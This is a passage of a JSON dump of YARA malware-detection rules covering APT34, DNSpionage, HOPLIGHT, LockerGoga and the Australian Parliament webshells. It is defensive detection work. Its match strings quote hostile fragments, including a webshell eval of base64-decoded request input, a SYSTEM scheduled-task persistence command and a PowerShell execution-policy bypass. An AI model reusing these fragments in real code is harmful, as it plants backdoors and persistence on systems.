wide\n      $s1 = \"C:\\\\Windows\\\\Temp\\\\\" wide\n      $s2 = \"CMD.exe\" fullword wide\n      $s3 = \"get_ProcessExtensionDataNames\" fullword ascii\n      $s4 = \"get_ProcessDictionaryKeys\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or all of ( $s* ) )\n}","date":"2019-04-24 15:49:51","description":"Detects DNSpionage Karkoff malware","minimum_yara":"1.7","name":"APT_DNSpionage_Karkoff_Malware_Apr19_1_RID34E4","reference":"https://blog.talosintelligence.com/2019/04/dnspionage-brings-out-karkoff.html","required_modules":[],"rule_hash":"162dc1ba6800b832c54879318e667a73","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule SUSP_Netsh_PortProxy_Command_RID3201 : DEMO SUSP T1016 T1090 {\n   meta:\n      description = \"Detects a suspicious command line with netsh and the portproxy command\"\n      author = \"Florian Roth\"\n      reference = \"https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy\"\n      date = \"2019-04-20 13:46:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP, T1016, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"netsh interface portproxy add v4tov4 listenport=\" ascii\n   condition: \n      1 of them\n}","date":"2019-04-20 13:46:41","description":"Detects a suspicious command line with netsh and the portproxy command","minimum_yara":"1.7","name":"SUSP_Netsh_PortProxy_Command_RID3201","reference":"https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy","required_modules":[],"rule_hash":"68532fbf626ca8572617ea3d943b7ca5","score":65,"tags":["SUSP","T1090","DEMO","T1016"]},{"author":"Florian Roth","content":"rule APT_APT34_PS_Malware_Apr19_1_RID3047 : APT DEMO MAL MIDDLE_EAST SCRIPT T1086 {\n   meta:\n      description = \"Detects APT34 PowerShell malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/0xffff0800/status/1118406371165126656\"\n      date = \"2019-04-17 12:33:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL, MIDDLE_EAST, SCRIPT, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"= get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID\" ascii\n      $x2 = \"Write-Host \\\"excepton occured!\\\"\" ascii\n      $s1 = \"Start-Sleep -s 1;\" fullword ascii\n      $s2 = \"Start-Sleep -m 100;\" fullword ascii\n   condition: \n      1 of ( $x* ) or 2 of them\n}","date":"2019-04-17 12:33:01","description":"Detects APT34 PowerShell malware","minimum_yara":"1.7","name":"APT_APT34_PS_Malware_Apr19_1_RID3047","reference":"https://twitter.com/0xffff0800/status/1118406371165126656","required_modules":[],"rule_hash":"c1fe071e781a227a5c95d54b3289a115","score":75,"tags":["SCRIPT","MAL","DEMO","T1086","MIDDLE_EAST","APT"]},{"author":"Florian Roth","content":"rule APT_APT34_PS_Malware_Apr19_2_RID3048 : APT DEMO MAL MIDDLE_EAST SCRIPT T1086 {\n   meta:\n      description = \"Detects APT34 PowerShell malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/0xffff0800/status/1118406371165126656\"\n      date = \"2019-04-17 12:33:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL, MIDDLE_EAST, SCRIPT, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"= \\\"http://\\\" + [System.Net.Dns]::GetHostAddresses(\\\"\" ascii\n      $x2 = \"$t = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID\" fullword ascii\n      $x3 = \"| Where { $_ -notmatch '^\\\\s+$' }\" ascii\n      $s1 = \"= new-object System.Net.WebProxy($u, $true);\" fullword ascii\n      $s2 = \" -eq \\\"dom\\\"){$\" ascii\n      $s3 = \" -eq \\\"srv\\\"){$\" ascii\n      $s4 = \"+\\\"<>\\\" | Set-Content\" ascii\n   condition: \n      1 of ( $x* ) and 3 of them\n}","date":"2019-04-17 12:33:11","description":"Detects APT34 PowerShell malware","minimum_yara":"1.7","name":"APT_APT34_PS_Malware_Apr19_2_RID3048","reference":"https://twitter.com/0xffff0800/status/1118406371165126656","required_modules":[],"rule_hash":"215c94487a658628bf47421e7c3905a0","score":75,"tags":["SCRIPT","MAL","DEMO","T1086","MIDDLE_EAST","APT"]},{"author":"Florian Roth","content":"rule APT_APT34_PS_Malware_Apr19_3_RID3049 : APT DEMO MAL MIDDLE_EAST SCRIPT T1053 T1086 {\n   meta:\n      description = \"Detects APT34 PowerShell malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/0xffff0800/status/1118406371165126656\"\n      date = \"2019-04-17 12:33:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL, MIDDLE_EAST, SCRIPT, T1053, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Powershell.exe -exec bypass -file ${global:$address1}\" \n      $x2 = \"schtasks /create /F /ru SYSTEM /sc minute /mo 10 /tn\" \n      $x3 = \"\\\"\\\\UpdateTasks\\\\UpdateTaskHosts\\\"\" \n      $x4 = \"wscript /b \\\\`\\\"${global:$address1\" ascii\n      $x5 = \"::FromBase64String([string]${global:$http_ag}))\" ascii\n      $x6 = \".run command1, 0, false\\\" | Out-File \" fullword ascii\n      $x7 = \"\\\\UpdateTask.vbs\" fullword ascii\n      $x8 = \"hUpdater.ps1\" fullword ascii\n   condition: \n      1 of them\n}","date":"2019-04-17 12:33:21","description":"Detects APT34 PowerShell malware","minimum_yara":"1.7","name":"APT_APT34_PS_Malware_Apr19_3_RID3049","reference":"https://twitter.com/0xffff0800/status/1118406371165126656","required_modules":[],"rule_hash":"16ba3f71f1cf420c79ab9bb0591c951e","score":75,"tags":["SCRIPT","MAL","DEMO","T1086","T1053","MIDDLE_EAST","APT"]},{"author":"Florian Roth","content":"rule APT_MAL_HOPLIGHT_NK_HiddenCobra_Apr19_1_RID33F3 : APT DEMO NK {\n   meta:\n      description = \"Detects HOPLIGHT malware used by HiddenCobra APT group\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/analysis-reports/AR19-100A\"\n      date = \"2019-04-13 15:09:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"www.naver.com\" fullword ascii\n      $s2 = \"PolarSSL Test CA0\" fullword ascii\n   condition: \n      filesize < 1000KB and all of them\n}","date":"2019-04-13 15:09:41","description":"Detects HOPLIGHT malware used by HiddenCobra APT group","minimum_yara":"1.7","name":"APT_MAL_HOPLIGHT_NK_HiddenCobra_Apr19_1_RID33F3","reference":"https://www.us-cert.gov/ncas/analysis-reports/AR19-100A","required_modules":[],"rule_hash":"95eac9f5b55c92081d385680feb1491f","score":75,"tags":["APT","DEMO","NK"]},{"author":"Florian Roth","content":"rule APT_MAL_HOPLIGHT_NK_HiddenCobra_Apr19_2_RID33F4 : APT DEMO EXE FILE NK T1050 {\n   meta:\n      description = \"Detects HOPLIGHT malware used by HiddenCobra APT group\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/analysis-reports/AR19-100A\"\n      date = \"2019-04-13 15:09:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, NK, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%SystemRoot%\\\\System32\\\\svchost.exe -k mdnetuse\" fullword ascii\n      $s2 = \"%s\\\\hid.dll\" fullword ascii\n      $s3 = \"%Systemroot%\\\\System32\\\\\" fullword ascii\n      $s4 = \"SYSTEM\\\\CurrentControlSet\\\\services\\\\%s\\\\Parameters\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them\n}","date":"2019-04-13 15:09:51","description":"Detects HOPLIGHT malware used by HiddenCobra APT group","minimum_yara":"1.7","name":"APT_MAL_HOPLIGHT_NK_HiddenCobra_Apr19_2_RID33F4","reference":"https://www.us-cert.gov/ncas/analysis-reports/AR19-100A","required_modules":[],"rule_hash":"775bd4c25cbbdfa32008e26ac9f14c22","score":75,"tags":["T1050","NK","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule APT_MAL_HOPLIGHT_NK_HiddenCobra_Apr19_3_RID33F5 : APT DEMO EXE FILE NK {\n   meta:\n      description = \"Detects HOPLIGHT malware used by HiddenCobra APT group\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/analysis-reports/AR19-100A\"\n      date = \"2019-04-13 15:10:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Oleaut32.dll\" fullword ascii\n      $s2 = \"Process32NextA\" fullword ascii\n      $s3 = \"Process32FirstA\" fullword ascii\n      $s4 = \"%sRSA key size  : %d bits\" fullword ascii\n      $s5 = \"emailAddress=\" fullword ascii\n      $s6 = \"%scert. version : %d\" fullword ascii\n      $s7 = \"www.naver.com\" fullword ascii\n      $x1 = \"ztretrtireotreotieroptkierert\" fullword ascii\n      $x2 = \"reykfgkodfgkfdskgdfogpdokgsdfpg\" fullword ascii\n      $x3 = \"fjiejffndxklfsdkfjsaadiepwn\" fullword ascii\n      $x4 = \"fgwljusjpdjah\" fullword ascii\n      $x5 = \"udbcgiut.dat\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and ( 1 of ( $x* ) or 6 of ( $s* ) )\n}","date":"2019-04-13 15:10:01","description":"Detects HOPLIGHT malware used by HiddenCobra APT group","minimum_yara":"1.7","name":"APT_MAL_HOPLIGHT_NK_HiddenCobra_Apr19_3_RID33F5","reference":"https://www.us-cert.gov/ncas/analysis-reports/AR19-100A","required_modules":[],"rule_hash":"26ef138d4d7e4ca52afa58538dfc0e01","score":75,"tags":["APT","DEMO","EXE","FILE","NK"]},{"author":"Florian Roth","content":"rule MAL_Ransomware_Wadhrama_RID2FED : CRIME DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects Wadhrama Ransomware via Imphash\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-04-07 12:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CRIME, DEMO, EXE, FILE, MAL, RANSOM\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and pe.imphash ( ) == \"f86dec4a80961955a89e7ed62046cc0e\"\n}","date":"2019-04-07 12:18:01","description":"Detects Wadhrama Ransomware via Imphash","minimum_yara":"1.7","name":"MAL_Ransomware_Wadhrama_RID2FED","reference":"Internal Research","required_modules":["pe"],"rule_hash":"73f47ca5c03a3ff245bcac4757d910a5","score":75,"tags":["RANSOM","MAL","DEMO","EXE","FILE","CRIME"]},{"author":"Florian Roth","content":"rule SUSP_RAR_with_PDF_Script_Obfuscation_RID34A4 : DEMO FILE OBFUS SUSP T1027 {\n   meta:\n      description = \"Detects RAR file with suspicious .pdf extension prefix to trick users\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-04-06 15:39:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, OBFUS, SUSP, T1027\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".pdf.vbe\" ascii\n      $s2 = \".pdf.vbs\" ascii\n      $s3 = \".pdf.ps1\" ascii\n      $s4 = \".pdf.bat\" ascii\n      $s5 = \".pdf.exe\" ascii\n   condition: \n      uint32 ( 0 ) == 0x21726152 and 1 of them\n}","date":"2019-04-06 15:39:11","description":"Detects RAR file with suspicious .pdf extension prefix to trick users","minimum_yara":"1.7","name":"SUSP_RAR_with_PDF_Script_Obfuscation_RID34A4","reference":"Internal Research","required_modules":[],"rule_hash":"d4b1823ab0ea714a6c2d166c792541ce","score":75,"tags":["SUSP","DEMO","T1027","FILE","OBFUS"]},{"author":"Florian Roth","content":"rule HKTL_Keyword_InjectDLL_RID2F20 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects suspicious InjectDLL keyword found in hacktools or possibly unwanted applications\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/zerosum0x0/koadic\"\n      date = \"2019-04-04 11:43:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"InjectDLL\" fullword ascii\n      $s4 = \"Kernel32.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and all of them\n}","date":"2019-04-04 11:43:51","description":"Detects suspicious InjectDLL keyword found in hacktools or possibly unwanted applications","minimum_yara":"1.7","name":"HKTL_Keyword_InjectDLL_RID2F20","reference":"https://github.com/zerosum0x0/koadic","required_modules":[],"rule_hash":"2300024c0b3687ad825d35a2b29acf0a","score":60,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule SUSP_Just_EICAR_RID2C24 : DEMO FILE SUSP {\n   meta:\n      description = \"Just an EICAR test file - this is boring stuff\"\n      author = \"Florian Roth\"\n      reference = \"http://2016.eicar.org/85-0-Download.html\"\n      date = \"2019-03-24 09:36:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x3558 and filesize < 70 and $s1 at 0\n}","date":"2019-03-24 09:36:31","description":"Just an EICAR test file - this is boring stuff","minimum_yara":"1.7","name":"SUSP_Just_EICAR_RID2C24","reference":"http://2016.eicar.org/85-0-Download.html","required_modules":[],"rule_hash":"0aee7058f1712891133de030fdb39f05","score":40,"tags":["SUSP","DEMO","FILE"]},{"author":"Florian Roth","content":"rule Ransom_LockerGoga_Mar19_1_RID3037 : DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects LockerGoga ransomware binaries\"\n      author = \"Florian Roth\"\n      reference = \"https://www.nrk.no/norge/skreddersydd-dobbeltangrep-mot-hydro-1.14480202\"\n      date = \"2019-03-19 12:30:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\.(doc|dot|wbk|docx|dotx|docb|xlm|xlsx|xltx|xlsb|xlw|ppt|pot|pps|pptx|potx|ppsx|sldx|pdf)\" wide\n      $x2 = \"|[A-Za-z]:\\\\cl.log\" wide\n      $x4 = \"\\\\crypto-locker\\\\\" ascii\n      $xc1 = { 00 43 00 6F 00 6D 00 70 00 61 00 6E 00 79 00 4E\n               00 61 00 6D 00 65 00 00 00 00 00 4D 00 6C 00 63\n               00 72 00 6F 00 73 00 6F 00 66 00 74 } \n      $xc2 = { 00 2E 00 6C 00 6F 00 63 00 6B 00 65 00 64 00 00\n               00 20 46 41 49 4C 45 44 20 00 00 00 00 20 00 00\n               00 20 75 6E 6B 6E 6F 77 6E 20 65 78 63 65 70 74\n               69 6F 6E } \n      $rn1 = \"This may lead to the impossibility of recovery of the certain files.\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 1 of ( $x* ) ) or $rn1\n}","date":"2019-03-19 12:30:21","description":"Detects LockerGoga ransomware binaries","minimum_yara":"1.7","name":"Ransom_LockerGoga_Mar19_1_RID3037","reference":"https://www.nrk.no/norge/skreddersydd-dobbeltangrep-mot-hydro-1.14480202","required_modules":[],"rule_hash":"ece0483614c79b6a6895fccec2ab336f","score":75,"tags":["DEMO","EXE","RANSOM","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_CMD_Script_Obfuscated_Feb19_1_RID32B7 : DEMO FILE OBFUS SCRIPT T1027 T1064 {\n   meta:\n      description = \"Detects obfuscated batch script using env variable sub-strings\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/DbgShell/status/1101076457189793793\"\n      date = \"2019-03-01 14:17:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, OBFUS, SCRIPT, T1027, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = { 40 65 63 68 6F 20 6F 66 66 0D 0A 73 65 74 20 } \n      $s1 = { 2C 31 25 0D 0A 65 63 68 6F 20 25 25 } \n   condition: \n      uint16 ( 0 ) == 0x6540 and filesize < 200KB and $h1 at 0 and uint16 ( filesize - 3 ) == 0x0d25 and uint8 ( filesize - 1 ) == 0x0a and $s1 in ( filesize - 200 .. filesize )\n}","date":"2019-03-01 14:17:01","description":"Detects obfuscated batch script using env variable sub-strings","minimum_yara":"1.7","name":"MAL_CMD_Script_Obfuscated_Feb19_1_RID32B7","reference":"https://twitter.com/DbgShell/status/1101076457189793793","required_modules":[],"rule_hash":"76fca7c0f6a35400aa98006c132d25e8","score":75,"tags":["OBFUS","T1064","SCRIPT","DEMO","T1027","FILE"]},{"author":"Florian Roth","content":"rule HKTL_Dsniff_RID2AFD : APT DEMO HKTL {\n   meta:\n      description = \"Detects Dsniff hack tool\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/eFoP4A\"\n      date = \"2019-02-19 08:47:21\"\n      score = 55\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \".*account.*|.*acct.*|.*domain.*|.*login.*|.*member.*\" \n   condition: \n      1 of them\n}","date":"2019-02-19 08:47:21","description":"Detects Dsniff hack tool","minimum_yara":"1.7","name":"HKTL_Dsniff_RID2AFD","reference":"https://goo.gl/eFoP4A","required_modules":[],"rule_hash":"02926ca7741beeaf77dd4dbc505c26b0","score":55,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule APT_WebShell_Tiny_1_RID2DFE : APT DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detetcs a tiny webshell involved in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 10:55:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"eval(\" ascii wide\n   condition: \n      ( uint16 ( 0 ) == 0x3f3c or uint16 ( 0 ) == 0x253c ) and filesize < 40 and $x1\n}","date":"2019-02-18 10:55:31","description":"Detetcs a tiny webshell involved in the Australian Parliament House network compromise","minimum_yara":"1.7","name":"APT_WebShell_Tiny_1_RID2DFE","reference":"https://twitter.com/cyb3rops/status/1097423665472376832","required_modules":[],"rule_hash":"5290299f5b4360e6da135e2a1ee34fb7","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE","APT"]},{"author":"Florian Roth","content":"rule APT_WebShell_AUS_Tiny_2_RID2F47 : APT DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detetcs a tiny webshell involved in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 11:50:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Request.Item[System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(\\\"[password]\\\"))];\" ascii\n      $x2 = \"eval(arguments,System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(\\\"\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3f3c or uint16 ( 0 ) == 0x253c ) and filesize < 1KB and 1 of them\n}","date":"2019-02-18 11:50:21","description":"Detetcs a tiny webshell involved in the Australian Parliament House network compromise","minimum_yara":"1.7","name":"APT_WebShell_AUS_Tiny_2_RID2F47","reference":"https://twitter.com/cyb3rops/status/1097423665472376832","required_modules":[],"rule_hash":"e8372bb28854117dc39430efa0b534f2","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE","APT"]},{"author":"Florian Roth","content":"rule APT_WebShell_AUS_JScript_3_RID3063 : APT DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detetcs a webshell involved in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 12:37:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<%@ Page Language=\\\"Jscript\\\" validateRequest=\\\"false\\\"%><%try{eval(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String\" ascii\n      $s2 = \".Item[\\\"[password]\\\"])),\\\"unsafe\\\");}\" ascii\n   condition: \n      uint16 ( 0 ) == 0x6568 and filesize < 1KB and all of them\n}","date":"2019-02-18 12:37:41","description":"Detetcs a webshell involved in the Australian Parliament House network compromise","minimum_yara":"1.7","name":"APT_WebShell_AUS_JScript_3_RID3063","reference":"https://twitter.com/cyb3rops/status/1097423665472376832","required_modules":[],"rule_hash":"f2f38cd4ee8bcf9bfc9850b3149e7d96","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE","APT"]},{"author":"Florian Roth","content":"rule APT_WebShell_AUS_4_RID2D46 : APT DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detetcs a webshell involved in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 10:24:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wProxy.Credentials = new System.Net.NetworkCredential(pusr, ppwd);\" fullword ascii\n      $s2 = \"{return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(\" ascii\n      $s3 = \".Equals('User-Agent', StringComparison.OrdinalIgnoreCase))\" ascii\n      $s4 = \"gen.Emit(System.Reflection.Emit.OpCodes.Ret);\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x7566 and filesize < 10KB and 3 of them\n}","date":"2019-02-18 10:24:51","description":"Detetcs a webshell involved in the Australian Parliament House network compromise","minimum_yara":"1.7","name":"APT_WebShell_AUS_4_RID2D46","reference":"https://twitter.com/cyb3rops/status/1097423665472376832","required_modules":[],"rule_hash":"b917ec27375f65f4d5456997b9908c85","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE","APT"]},{"author":"Florian Roth","content":"rule APT_Script_AUS_4_RID2CA5 : APT DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detetcs a script involved in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 09:58:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"myMutex = CreateMutex(0, 1, \\\"teX23stNew\\\")\" fullword ascii\n      $x2 = \"mmpath = Environ(appdataPath) & \\\"\\\\\\\" & \\\"Microsoft\\\" & \\\"\\\\\\\" & \\\"mm.accdb\\\"\" fullword ascii\n      $x3 = \"Dim mmpath As String, newmmpath  As String, appdataPath As String\" fullword ascii\n      $x4 = \"'MsgBox \\\"myMutex Created\\\" Do noting\" fullword ascii\n      $x5 = \"appdataPath = \\\"app\\\" & \\\"DatA\\\"\" fullword ascii\n      $x6 = \".DoCmd.Close , , acSaveYes\" fullword ascii\n   condition: \n      filesize < 7KB and 1 of them\n}","date":"2019-02-18 09:58:01","description":"Detetcs a script involved in the Australian Parliament House network compromise","minimum_yara":"1.7","name":"APT_Script_AUS_4_RID2CA5","reference":"https://twitter.com/cyb3rops/status/1097423665472376832","required_modules":[],"rule_hash":"bbab688544d15089b70b810eed4f42ce","score":75,"tags":["T1100","DEMO","WEBSHELL","APT"]},{"author":"Florian Roth","content":"rule APT_WebShell_AUS_5_RID2D47 : APT DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detetcs a webshell involved in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 10:25:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"function DEC(d){return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(d));}\" fullword ascii\n      $a2 = \"function ENC(d){return Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(d));}\" fullword ascii\n      $s1 = \"var hash=DEC(Request.Item['\" ascii\n      $s2 = \"Response.Write(ENC(SET_ASS_SUCCESS));\" fullword ascii\n      $s3 = \"hashtable[hash] = assCode;\" fullword ascii\n      $s4 = \"Response.Write(ss);\" fullword ascii\n      $s5 = \"var hashtable = Application[CachePtr];\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x7566 and filesize < 2KB and 4 of them\n}","date":"2019-02-18 10:25:01","description":"Detetcs a webshell involved in the Australian Parliament House network compromise","minimum_yara":"1.7","name":"APT_WebShell_AUS_5_RID2D47","reference":"https://twitter.com/cyb3rops/status/1097423665472376832","required_modules":[],"rule_hash":"c7da99b5ca7eaea74482829f77f3774d","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE","APT"]},{"author":"Florian Roth","content":"rule HKTL_PowerKatz_Feb19_1_RID2EB0 : DEMO HKTL {\n   meta:\n      description = \"Detetcs a tool used in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 11:25:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Powerkatz32\" ascii wide fullword\n      $x2 = \"Powerkatz64\" ascii wide\n      $s1 = \"GetData: not found taskName\" fullword ascii wide\n      $s2 = \"GetRes Ex:\" fullword ascii wide\n   condition: \n      1 of ( $x* ) and 1 of ( $s* )\n}","date":"2019-02-18 11:25:11","description":"Detetcs a tool used in the Australian Parliament House network compromise","minimum_yara":"1.7","name":"HKTL_PowerKatz_Feb19_1_RID2EB0","reference":"https://twitter.com/cyb3rops/status/1097423665472376832","required_modules":[],"rule_hash":"9dad892eb3185948cd94185fab356fa0","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_Unknown_Feb19_1_RID2DF9 : DEMO HKTL {\n   meta:\n      description = \"Detetcs a tool used in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 10:54:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"not a valid timeout format!\" ascii wide fullword\n      $x2 = \"host can not be empty!\" ascii wide fullword\n      $x3 = \"not a valid port format!\" ascii wide fullword\n      $x4 = \"{0} - {1} TTL={2} time={3}\" ascii wide fullword\n      $x5 = \"ping count is not a correct format!\" ascii wide fullword\n      $s1 = \"The result is too large,program store to '{0}'.Please download it manully.\" fullword ascii wide\n      $s2 = \"C:\\\\Windows\\\\temp\\\\\" ascii wide\n   condition: \n      1 of ( $x* ) or 2 of them\n}","date":"2019-02-18 10:54:41","description":"Detetcs a tool used in the 